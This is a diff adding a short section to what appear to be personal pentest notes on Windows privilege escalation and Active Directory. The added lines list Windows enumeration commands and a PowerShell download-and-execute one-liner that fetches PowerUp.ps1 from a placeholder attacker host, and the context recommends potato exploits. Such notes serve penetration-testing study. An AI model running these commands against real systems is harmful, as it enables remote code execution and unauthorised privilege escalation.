@@ -2,6 +2,22 @@
 
 ### Both AD and Windows PrivEsc go together 
 
+## Manual look up
+
+```
+whoami /priv
+whoami /groups
+systeminfo
+net user
+net localgroup administrators
+```
+## PowerUp commands
+One way to share it, in power shell:
+```
+IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
+```
+
+
 ## Low Hanging Fruit 
 
 If you see Impersonate with whoami /priv, stick with sigma and god potato:
